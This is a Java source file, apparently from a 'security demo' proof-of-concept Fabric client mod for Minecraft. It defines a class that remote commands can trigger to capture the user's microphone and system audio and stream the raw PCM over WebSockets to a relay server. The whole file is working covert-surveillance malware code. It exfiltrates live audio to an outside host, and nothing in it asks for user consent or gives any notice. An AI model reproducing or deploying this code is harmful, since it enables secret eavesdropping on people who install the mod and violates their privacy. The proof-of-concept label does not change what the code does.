package com.securitydemo.poc;

import com.google.gson.JsonObject;
import java.io.IOException;
import java.net.URI;
import java.util.function.Consumer;
import javax.sound.sampled.AudioFormat;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;

@Environment(EnvType.CLIENT)
final class RemoteAudioPublisher {
   private static final PocLogger.Log LOGGER = PocLogger.get();
   private final String serverBase;
   private final String sessionId;
   private final Consumer<String> notifyRelay;
   private final AudioCapture micCapture = new AudioCapture();
   private final AudioCapture sysCapture = new AudioCapture();
   private volatile RelaySocket micSocket;
   private volatile RelaySocket sysSocket;
   private volatile int micSampleRate = 16000;
   private volatile int micChannels = 1;
   private volatile int sysSampleRate = 16000;
   private volatile int sysChannels = 1;
   private volatile String micDevice;
   private volatile String sysDevice;
   private volatile boolean micRunning;
   private volatile boolean sysRunning;
   private volatile String micRunningDevice;
   private volatile String sysRunningDevice;

   RemoteAudioPublisher(String serverBase, String sessionId, Consumer<String> notifyRelay) {
      this.serverBase = serverBase;
      this.sessionId = sessionId;
      this.notifyRelay = notifyRelay;
   }

   void handleControl(String source, String action, int sampleRate, int channels, String device) {
      LOGGER.info("Audio control: {} {} ({}Hz {}ch device={})", source, action, sampleRate, channels, device);
      if ("mic".equals(source)) {
         this.micSampleRate = sampleRate > 0 ? sampleRate : 16000;
         this.micChannels = channels > 0 ? channels : 1;
         if (!Compat.isBlank(device)) {
            this.micDevice = device;
         }

         if ("start".equals(action)) {
            this.startMic();
         } else if ("stop".equals(action)) {
            this.stopMic();
         }

      } else {
         if ("sys".equals(source)) {
            this.sysSampleRate = sampleRate > 0 ? sampleRate : 16000;
            this.sysChannels = channels > 0 ? channels : 1;
            if (!Compat.isBlank(device)) {
               this.sysDevice = device;
            }

            if ("start".equals(action)) {
               this.startSys();
            } else if ("stop".equals(action)) {
               this.stopSys();
            }
         }

      }
   }

   void shutdown() {
      this.stopMic();
      this.stopSys();
   }

   private void startMic() {
      String targetDevice = this.micDevice == null ? "" : this.micDevice;
      if (this.micRunning && this.micSocket != null && this.micSocket.isOpen() && targetDevice.equals(this.micRunningDevice == null ? "" : this.micRunningDevice)) {
         LOGGER.info("Mic already active on {}, skip restart", this.micRunningDevice);
         this.sendStatus("mic", true, this.micCapture.activeDeviceName(), this.micSampleRate, this.micChannels, (String)null);
      } else {
         this.stopMic();

         try {
            this.micSocket = this.connectAudioSocket("mic");
            this.micCapture.start(AudioCapture.Source.MIC, this.micSampleRate, this.micChannels, this.micDevice, new Consumer<byte[]>() {
               public void accept(byte[] chunk) {
                  RemoteAudioPublisher.sendPcm(RemoteAudioPublisher.this.micSocket, chunk);
               }
            });
            AudioFormat format = this.micCapture.format();
            if (format != null) {
               sendFormat(this.micSocket, (int)format.getSampleRate(), format.getChannels());
               this.sendStatus("mic", true, this.micCapture.activeDeviceName(), (int)format.getSampleRate(), format.getChannels(), (String)null);
            } else {
               sendFormat(this.micSocket, this.micSampleRate, this.micChannels);
               this.sendStatus("mic", true, this.micDevice, this.micSampleRate, this.micChannels, (String)null);
            }

            this.micRunning = true;
            this.micRunningDevice = targetDevice;
         } catch (Exception e) {
            LOGGER.warn("Mic capture failed: {}", e.getMessage(), e);
            this.sendStatus("mic", false, this.micDevice, this.micSampleRate, this.micChannels, e.getMessage());
            this.stopMic();
         }

      }
   }

   private void startSys() {
      String targetDevice = this.sysDevice == null ? "" : this.sysDevice;
      if (this.sysRunning && this.sysSocket != null && this.sysSocket.isOpen() && targetDevice.equals(this.sysRunningDevice == null ? "" : this.sysRunningDevice)) {
         LOGGER.info("System audio already active on {}, skip restart", this.sysRunningDevice);
         this.sendStatus("sys", true, this.sysCapture.activeDeviceName(), this.sysSampleRate, this.sysChannels, (String)null);
      } else {
         this.stopSys();

         try {
            this.sysSocket = this.connectAudioSocket("sys");
            this.sysCapture.start(AudioCapture.Source.SYSTEM, this.sysSampleRate, this.sysChannels, this.sysDevice, new Consumer<byte[]>() {
               public void accept(byte[] chunk) {
                  RemoteAudioPublisher.sendPcm(RemoteAudioPublisher.this.sysSocket, chunk);
               }
            });
            AudioFormat format = this.sysCapture.format();
            if (format != null) {
               sendFormat(this.sysSocket, (int)format.getSampleRate(), format.getChannels());
               this.sendStatus("sys", true, this.sysCapture.activeDeviceName(), (int)format.getSampleRate(), format.getChannels(), (String)null);
            } else {
               sendFormat(this.sysSocket, this.sysSampleRate, this.sysChannels);
               this.sendStatus("sys", true, this.sysDevice, this.sysSampleRate, this.sysChannels, (String)null);
            }

            this.sysRunning = true;
            this.sysRunningDevice = targetDevice;
         } catch (Exception e) {
            LOGGER.warn("System audio capture failed: {}", e.getMessage(), e);
            this.sendStatus("sys", false, this.sysDevice, this.sysSampleRate, this.sysChannels, e.getMessage());
            this.stopSys();
         }

      }
   }

   private void sendStatus(String source, boolean ok, String device, int sampleRate, int channels, String error) {
      JsonObject json = new JsonObject();
      json.addProperty("type", "audio_status");
      json.addProperty("source", source);
      json.addProperty("ok", ok);
      if (device != null) {
         json.addProperty("device", device);
      }

      json.addProperty("sampleRate", sampleRate);
      json.addProperty("channels", channels);
      if (error != null) {
         json.addProperty("error", error);
      }

      this.notifyRelay.accept(json.toString());
   }

   private void stopMic() {
      this.micRunning = false;
      this.micRunningDevice = null;
      this.micCapture.stop();
      closeSocket(this.micSocket);
      this.micSocket = null;
   }

   private void stopSys() {
      this.sysRunning = false;
      this.sysRunningDevice = null;
      this.sysCapture.stop();
      closeSocket(this.sysSocket);
      this.sysSocket = null;
   }

   private RelaySocket connectAudioSocket(final String source) throws IOException {
      String wsBase = this.serverBase.replace("https://", "wss://").replace("http://", "ws://");
      URI uri = URI.create(wsBase + "/ws/mod/" + this.sessionId + "/" + source);
      return RelaySocket.connect(uri, new RelaySocket.Listener() {
         public void onOpen(RelaySocket socket) {
            RemoteAudioPublisher.LOGGER.info("Audio WebSocket open ({})", source);
         }

         public void onText(String message) {
         }

         public void onBinary(byte[] data) {
         }

         public void onClose(int code, String reason) {
            RemoteAudioPublisher.LOGGER.warn("Audio WebSocket closed ({}) {} {}", source, code, reason);
         }

         public void onError(Throwable error) {
            RemoteAudioPublisher.LOGGER.warn("Audio WebSocket error ({})", source, error);
         }
      }, 10000);
   }

   private static void sendFormat(RelaySocket socket, int sampleRate, int channels) {
      if (socket != null && socket.isOpen()) {
         socket.sendText("{\"type\":\"audio_format\",\"sampleRate\":" + sampleRate + ",\"channels\":" + channels + ",\"encoding\":\"pcm16le\"}");
      }
   }

   private static void sendPcm(RelaySocket socket, byte[] chunk) {
      if (socket != null && socket.isOpen()) {
         socket.sendBinary(chunk);
      }
   }

   private static void closeSocket(RelaySocket socket) {
      if (socket != null) {
         socket.close();
      }

   }
}
